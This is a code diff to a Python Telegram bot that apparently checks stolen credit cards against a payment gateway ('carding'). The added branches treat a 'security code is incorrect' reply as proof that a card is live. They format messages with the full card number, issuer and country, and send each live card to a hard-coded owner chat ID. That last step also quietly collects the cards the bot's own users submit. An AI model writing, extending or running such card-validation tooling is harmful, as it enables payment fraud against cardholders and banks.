@@ -481,12 +481,25 @@ def main(message):
 						
 				elif "Your card's security code is incorrect." in last:
 					live += 1
-					send_telegram_notification(msg)
-					bot.reply_to(message, msg)
+					msg_cvv = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+					
+𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: CVV Incorrect (Card is Live)
+
+𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
+𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
+𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}
+
+𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
+𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
+𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
+𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
+					send_telegram_notification(msg_cvv)
+					bot.reply_to(message, msg_cvv)
 					
 					# Send to owner
 					try:
-						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
+						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg_cvv}", parse_mode="HTML")
 					except:
 						pass
 						
@@ -736,6 +749,29 @@ def single_check(message):
             # Send to owner
             try:
                 bot.send_message(1172862169, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg_sec}", parse_mode="HTML")
+            except:
+                pass
+                
+        elif "security code is incorrect" in last_lower or "cvv" in last_lower or "cvc" in last_lower:
+            # This is a LIVE card with wrong CVV
+            msg_live = f'''✅ <b>LIVE CARD FOUND!</b>
+
+💳 <b>Card:</b> <code>{cc}</code>
+🏦 <b>Gateway:</b> 1$ Charged
+📊 <b>Response:</b> CVV Incorrect (Card is Live)
+
+ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
+🏛️ <b>Issuer:</b> {bank}
+🌍 <b>Country:</b> {cn} {emj}
+
+⏱️ <b>Time:</b> 0 seconds
+👤 <b>Checked By:</b> @{username}
+🤖 <b>Bot By:</b> @god_forever'''
+            bot.edit_message_text(msg_live, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
+            
+            # Send to owner
+            try:
+                bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg_live}", parse_mode="HTML")
             except:
                 pass
                 
